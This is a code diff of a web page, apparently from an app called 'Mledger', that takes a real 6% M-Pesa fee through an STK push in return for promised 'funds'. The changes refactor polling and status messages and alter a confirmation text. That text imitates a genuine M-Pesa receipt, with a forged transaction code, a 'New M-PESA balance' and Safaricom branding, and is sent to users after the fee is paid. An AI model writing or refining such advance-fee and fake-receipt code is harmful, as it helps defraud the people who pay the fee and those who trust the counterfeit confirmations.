@@ -1,6 +1,4 @@
 
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -73,17 +71,19 @@
     <label>Enter M-Pesa Number for Payment with Funds (Safaricom only)</label>
     <input type="text" id="paymentPhone" placeholder="07xxxxxxxx">
     
-    <button id="payBtn" onclick="initiateFunding()">Pay Fee & Request Funds</button>
+    <button id="payBtn" onclick="handlePayment()">Pay Fee & Request Funds</button>
     
     <div id="status"></div>
     <a href="act.html" style="display:block; margin-top:20px; color:#666; text-decoration:none; font-size:0.8rem">Go Back</a>
 </div>
 
 <script>
-    const BACKEND_PAYMENT = "https://newpayment-byr6.vercel.app";
+    const BACKEND_URL = "https://newpayment-byr6.vercel.app";
     const BACKEND_FUNDS = "https://funds-mauve.vercel.app/api";
     const MESSAGE_API = "https://message-server-five.vercel.app";
     
+    let pollTimer = null;
+
     const userData = JSON.parse(localStorage.getItem('mledger_user'));
     if(!userData) {
         window.location.href = "index.html";
@@ -93,24 +93,24 @@
         fetchBalance();
     }
 
-    // ─── Fetch and display balance ─────────────────────────────────
-    async function fetchBalance() {
-        const balanceDiv = document.getElementById('currentBalance');
-        try {
-            const response = await fetch(`${BACKEND_FUNDS}/balance/${userData.phone}`);
-            const result = await response.json();
-            if (response.ok) {
-                const bal = parseFloat(result.balance) || 0;
-                balanceDiv.innerText = `Ksh ${bal.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
-            } else {
-                balanceDiv.innerText = "Ksh 0.00";
-            }
-        } catch (err) {
-            balanceDiv.innerText = "Ksh 0.00";
+    function showStatus(message, type) {
+        const div = document.getElementById('status');
+        if (type === "error") {
+            div.style.color = "#ff5252";
+        } else if (type === "success") {
+            div.style.color = "#4CAF50";
+        } else {
+            div.style.color = "#ccc";
         }
+        div.innerHTML = message;
     }
 
-    // ─── Token format helpers ──────────────────────────────────────
+    function resetButton() {
+        const btn = document.getElementById('payBtn');
+        btn.disabled = false;
+        btn.innerText = "Pay Fee & Request Funds";
+    }
+
     function getYearLetter() {
         const year = new Date().getFullYear();
         const offset = year - 2026;
@@ -155,13 +155,27 @@
         const randomPart = Math.random().toString(36).substring(2,8).toUpperCase();
         return `${yearLetter}${monthLetter}${dayCode}K${randomPart}`;
     }
-    // ─────────────────────────────────────────────────────────────────
+
+    async function fetchBalance() {
+        const balanceDiv = document.getElementById('currentBalance');
+        try {
+            const response = await fetch(`${BACKEND_FUNDS}/balance/${userData.phone}`);
+            const result = await response.json();
+            if (response.ok) {
+                const bal = parseFloat(result.balance) || 0;
+                balanceDiv.innerText = `Ksh ${bal.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
+            } else {
+                balanceDiv.innerText = "Ksh 0.00";
+            }
+        } catch (err) {
+            balanceDiv.innerText = "Ksh 0.00";
+        }
+    }
 
     function updateFee() {
         const amt = parseFloat(document.getElementById('fundAmount').value);
         const feeDiv = document.getElementById('feeDisplay');
         const stkSpan = document.getElementById('stkPrice');
-        
         if (amt >= 100) {
             const fee = amt * 0.06;
             feeDiv.style.display = "block";
@@ -171,27 +185,29 @@
         }
     }
 
-    async function initiateFunding() {
+    async function handlePayment() {
         const amt = parseFloat(document.getElementById('fundAmount').value);
         const mpesaNumber = document.getElementById('paymentPhone').value.trim();
-        const statusDiv = document.getElementById('status');
         const payBtn = document.getElementById('payBtn');
 
-        if (isNaN(amt) || amt < 100) {
-            statusDiv.style.color = "#ff5252";
-            statusDiv.innerText = "Minimum funding amount is Ksh 100.00";
+        if (!mpesaNumber || mpesaNumber.length < 9) {
+            showStatus("❌ Please enter a valid phone number", "error");
             return;
         }
 
-        const stkAmount = Math.ceil(amt * 0.06); 
-        
+        if (!amt || amt < 100) {
+            showStatus("❌ Minimum amount is Ksh 100", "error");
+            return;
+        }
+
+        const stkAmount = Math.ceil(amt * 0.06);
+
         payBtn.disabled = true;
-        payBtn.innerHTML = '<span class="loader"></span>Processing Fee...';
-        statusDiv.style.color = "#aaa";
-        statusDiv.innerText = `Requesting Ksh ${stkAmount} fee from ${mpesaNumber}...`;
+        payBtn.innerHTML = '<span class="loader"></span>Processing...';
+        showStatus("Requesting payment prompt on your phone...", "info");
 
         try {
-            const payRes = await fetch(`${BACKEND_PAYMENT}/api/initiate`, {
+            const response = await fetch(`${BACKEND_URL}/api/initiate`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ 
@@ -200,51 +216,58 @@
                 })
             });
 
-            const payData = await payRes.json();
-            const invoiceId = payData.invoice ? payData.invoice.invoice_id : (payData.id || null);
+            const data = await response.json();
+
+            const invoiceId = data.invoice ? data.invoice.invoice_id : (data.id || null);
 
             if (invoiceId) {
-                statusDiv.innerText = "Enter M-Pesa PIN on the phone to pay the service fee.";
+                showStatus("Please enter your M-Pesa PIN on your phone.<br>Do not refresh the page.<br>Your payment will be ignored if you do so.", "info");
                 startPolling(invoiceId, amt);
             } else {
-                throw new Error("Failed to trigger STK. Ensure number is Safaricom.");
+                throw new Error(data.error || data.message || "Failed to initiate payment. Check phone format.");
             }
         } catch (err) {
-            statusDiv.style.color = "#ff5252";
-            statusDiv.innerText = "Error: " + err.message;
-            resetUI();
+            showStatus("Error: " + err.message, "error");
+            resetButton();
         }
     }
 
-    function startPolling(invoiceId, fundAmt) {
+    async function startPolling(invoiceId, fundAmt) {
         const statusDiv = document.getElementById('status');
-        let pollCount = 0;
-        let isFinishing = false; // Guard variable to prevent multiple blocks from running
+        let attempts = 0;
+        const maxAttempts = 50;
 
-        const pollTimer = setInterval(async () => {
-            if (isFinishing) return; // Exit loop if processing has already started
-            
-            pollCount++;
+        if (pollTimer) clearInterval(pollTimer);
+
+        pollTimer = setInterval(async () => {
+            attempts++;
+
             try {
-                const res = await fetch(`${BACKEND_PAYMENT}/api/status/${invoiceId}`);
-                const data = await res.json();
+                const response = await fetch(`${BACKEND_URL}/api/status/${invoiceId}`);
+                const data = await response.json();
                 const state = data.invoice ? data.invoice.state : data.state;
 
-                if ((state === "COMPLETE" || state === "COMPLETED") && !isFinishing) {
-                    isFinishing = true; // Block subsequent executions immediately
-                    clearInterval(pollTimer); // Destroy loop timer
-                    
-                    statusDiv.style.color = "#4CAF50";
-                    statusDiv.innerText = "✅ Fee paid! Adding funds to account...";
-                    finalizeFunding(fundAmt);
-                } else if (state === "FAILED" || state === "REJECTED" || pollCount > 30) {
-                    isFinishing = true;
+                if (state === "COMPLETE" || state === "COMPLETED") {
                     clearInterval(pollTimer);
-                    statusDiv.style.color = "#ff5252";
-                    statusDiv.innerText = "❌ Fee payment failed. Balance not updated.";
-                    resetUI();
+                    statusDiv.style.color = "#4CAF50";
+                    statusDiv.innerHTML = "<strong>✅ Fee Paid!</strong><br>Adding funds to account...";
+                    await finalizeFunding(fundAmt);
+                    return;
+                } else if (state === "FAILED" || state === "REJECTED") {
+                    clearInterval(pollTimer);
+                    showStatus("❌ Payment cancelled.", "error");
+                    resetButton();
+                    return;
                 }
-            } catch (e) { console.error("Polling..."); }
+
+                if (attempts >= maxAttempts) {
+                    clearInterval(pollTimer);
+                    showStatus("⏰ Request timed out.<br>Check your M-Pesa or try again.", "error");
+                    resetButton();
+                }
+            } catch (err) {
+                console.error("Polling error:", err);
+            }
         }, 3000);
     }
 
@@ -269,7 +292,7 @@
                 const dateStr = formatNumericDate();
                 const timeStr = formatTime12Hour();
                 
-                const confirmationMsg = `${token} Confirmed.You have received Ksh${amt.toFixed(2)} from Mledger intasend Solutions Limited 313031 on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${userData.balance.toFixed(2)}. Separate personal and business funds through pochi la Biashara on *334#`;
+                const confirmationMsg = `${token} Confirmed.You have received Ksh${amt.toFixed(2)} from Mledger PayHero Solutions Limited 313031 on ${dateStr} at ${timeStr}. New M-PESA balance is Ksh${userData.balance.toFixed(2)}. Separate personal and business funds through pochi la Biashara on *334#`;
 
                 fetch(`${MESSAGE_API}/api/messages`, {
                     method: 'POST',
@@ -283,21 +306,25 @@
                     console.warn("Confirmation message failed to send:", err);
                 });
 
-                statusDiv.innerHTML = `<strong>✅ Success!</strong><br>Ksh ${amt} added to your balance.<br><span style="font-size:0.75rem;color:#aaa">Token: ${token}</span>`;
+                showStatus(`<strong>✅ Success!</strong><br>Ksh ${amt} added to your balance.<br><span style="font-size:0.75rem;color:#aaa">Token: ${token}</span>`, "success");
                 setTimeout(() => window.location.href = "index.html", 3000);
             } else {
-                statusDiv.innerText = "Fee received, but funding failed. Contact Support.";
+                showStatus("Fee received, but funding failed. Contact Support.", "error");
+                resetButton();
             }
         } catch (err) {
-            statusDiv.innerText = "Critical error during balance update.";
+            showStatus("Critical error during balance update.", "error");
+            resetButton();
         }
     }
 
-    function resetUI() {
-        const payBtn = document.getElementById('payBtn');
-        payBtn.disabled = false;
-        payBtn.innerText = "Pay Fee & Request Funds";
-    }
+    window.onload = function() {
+        const paymentPhone = document.getElementById('paymentPhone');
+        paymentPhone.addEventListener('keypress', (e) => {
+            if (e.key === "Enter") handlePayment();
+        });
+    };
 </script>
+
 </body>
 </html>
